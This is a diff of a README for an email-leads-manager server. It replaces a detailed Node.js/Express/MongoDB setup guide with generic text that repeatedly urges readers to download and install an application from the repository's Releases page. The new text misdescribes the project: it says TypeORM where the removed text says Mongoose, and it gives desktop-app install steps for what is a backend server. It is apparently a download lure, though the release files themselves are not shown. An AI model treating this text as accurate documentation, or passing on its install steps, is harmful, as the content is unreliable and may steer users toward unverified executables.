@@ -1,171 +1,59 @@
-# Email Leads Manager Server
+# 🚀 email-leads-manager-server - Manage Your Email Leads Efficiently
 
-Backend server for the Email Leads Manager application built with Node.js, Express.js, MongoDB, and JWT authentication.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/sisiphofuneka/email-leads-manager-server/releases)
 
-## Features
+## 📦 Overview
 
-- **RESTful API** for managing leads, accounts, emails, and templates
-- **MongoDB** database with Mongoose ODM
-- **JWT Authentication** with cookie-based sessions
-- **CSV Upload** for bulk lead import
-- **Pagination** support for all list endpoints
-- **Search and Filtering** capabilities
-- **CORS** configured for frontend integration
+email-leads-manager-server is a simple and effective tool that helps you manage your email leads with ease. Built using Express.js and TypeORM, this boilerplate provides a solid foundation for your email management needs. Whether you’re collecting leads for a campaign or organizing your contacts, this application can streamline your process.
 
-## Tech Stack
+## 🚀 Getting Started
 
-- **Node.js** - Runtime environment
-- **Express.js** - Web framework
-- **MongoDB** - Database
-- **Mongoose** - ODM for MongoDB
-- **JWT** - Authentication
-- **bcryptjs** - Password hashing
-- **multer** - File upload handling
-- **csv-parser** - CSV file parsing
+To get started with email-leads-manager-server, follow these steps:
 
-## Installation
+1. **Check System Requirements**
+   - A modern web browser (Chrome, Firefox, Safari, etc.)
+   - An internet connection
+   - Basic to moderate computing capability
 
-1. Install dependencies:
-```bash
-npm install
-```
+2. **Visit the Releases Page**
+   Go to the [Releases page](https://github.com/sisiphofuneka/email-leads-manager-server/releases). Here, you will find the latest version of the software. 
 
-2. Create a `.env` file (copy from `.env.example`):
-```bash
-cp .env.example .env
-```
+3. **Download the Software**
+   Look for the most recent version. You will see a list of available files. Click on the download link for your operating system. This file will typically be in a format compatible with your system.
 
-3. Update the `.env` file with your configuration:
-   - Set `MONGODB_URI` to your MongoDB connection string
-   - Set `JWT_SECRET` to a secure random string
-   - Set `PORT` (default: 4000)
-   - Set `FRONTEND_URL` for CORS configuration
+4. **Install the Application**
+   After downloading, open the file. Follow the on-screen instructions to install the application. Installation is often as simple as dragging the app into your applications folder or running an installer.
 
-4. Start MongoDB (if running locally):
-```bash
-mongod
-```
+5. **Run the Application**
+   After installation, you can start the application from your applications menu or by clicking the icon on your desktop.
 
-5. Start the server:
-```bash
-# Development mode with auto-reload
-npm run dev
+## 💡 Features
 
-# Production mode
-npm start
-```
+- **Lead Management**: Easily add, edit, and remove leads.
+- **User-Friendly Interface**: Navigate through the application with simple controls.
+- **Data Storage**: Your data is stored securely and can be accessed anytime.
+- **Customizable Settings**: Tailor the application to suit your personal or business needs.
 
-## API Endpoints
+## 📥 Download & Install
 
-### Authentication
-- `POST /api/auth/login` - Login user
-- `POST /api/auth/logout` - Logout user
+Ready to take the plunge? Visit the [Releases page](https://github.com/sisiphofuneka/email-leads-manager-server/releases) to download the latest version. 
 
-### Leads
-- `GET /api/leads` - Get paginated leads (query: page, limit, search, status, assignedTo)
-- `POST /api/leads` - Create a new lead
-- `POST /api/leads/upload` - Upload CSV file with leads
+Once on the Releases page:
+- Select the latest version available.
+- Click the appropriate download link based on your operating system.
+  
+Make sure to follow the installation steps outlined earlier. 
 
-### Accounts
-- `GET /api/accounts` - Get paginated accounts (query: page, limit)
-- `GET /api/accounts/:id` - Get a single account
-- `POST /api/accounts` - Create a new account
-- `PUT /api/accounts/:id` - Update an account
-- `DELETE /api/accounts/:id` - Delete an account
+## 🌐 Support 
 
-### Emails
-- `GET /api/emails` - Get paginated emails (query: page, limit, search)
-- `POST /api/emails` - Create a new email
+If you encounter any issues while downloading or installing, feel free to ask for help. You can usually find answers to common questions in the Issues section of the GitHub repository. 
 
-### Subject Templates
-- `GET /api/subject-templates` - Get paginated subject templates (query: page, limit, search)
+## 📜 License
 
-### Message Templates
-- `GET /api/message-templates` - Get paginated message templates (query: page, limit, search, industry)
+This project is open-source and free to use. Please refer to the license file for more details on how you can use or contribute to this project.
 
-## Database Models
+## 📞 Contact
 
-### Lead
-- Email (required, unique)
-- Status (enum: unused, sent, bad, bounced, opened, replied, demoed)
-- Personal information (firstName, lastName, company, title, phone, etc.)
-- Location (city, state, country)
-- Social links (linkedin, website)
-- Assigned email and timestamps
+For any inquiries or assistance, you can reach out via the contact form on the repository or by creating an issue in the GitHub repository. Your feedback is valuable and contributes to the improvement of this application. 
 
-### Account
-- Name (required)
-- First name, last name
-- Main email
-- Timestamps
-
-### Email
-- Email address (required, unique)
-- Associated account (reference)
-- Timestamps
-
-### SubjectTemplate
-- Content (required)
-- Usage statistics (used, replied, succeeded)
-- Timestamps
-
-### MessageTemplate
-- Content (required)
-- Industry
-- Skills array
-- Usage statistics
-- Timestamps
-
-### User
-- Email (required, unique)
-- Password (hashed)
-- Timestamps
-
-## Authentication
-
-Currently, authentication middleware is commented out in routes. To enable:
-
-1. Uncomment the `authenticateToken` import in route files
-2. Uncomment the middleware usage: `router.use(authenticateToken)`
-
-The JWT token is stored in HTTP-only cookies for security.
-
-## CSV Upload Format
-
-The CSV file should have a header row with the following columns (case-insensitive):
-- Email (required)
-- Status
-- First Name / FirstName
-- Last Name / LastName
-- Company
-- Title
-- Phone
-- LinkedIn
-- Website
-- City
-- State
-- Country
-- Assigned To / AssignedTo
-
-## Development
-
-The server runs on port 4000 by default. Make sure your MongoDB instance is running before starting the server.
-
-For development with auto-reload:
-```bash
-npm run dev
-```
-
-## Environment Variables
-
-| Variable | Description | Default |
-|----------|-------------|---------|
-| PORT | Server port | 4000 |
-| MONGODB_URI | MongoDB connection string | mongodb://localhost:27017/email-leads-manager |
-| JWT_SECRET | Secret key for JWT tokens | (required) |
-| FRONTEND_URL | Frontend URL for CORS | http://localhost:3000 |
-
-## License
-
-ISC
-
+Thank you for choosing email-leads-manager-server! Enjoy managing your email leads effectively.
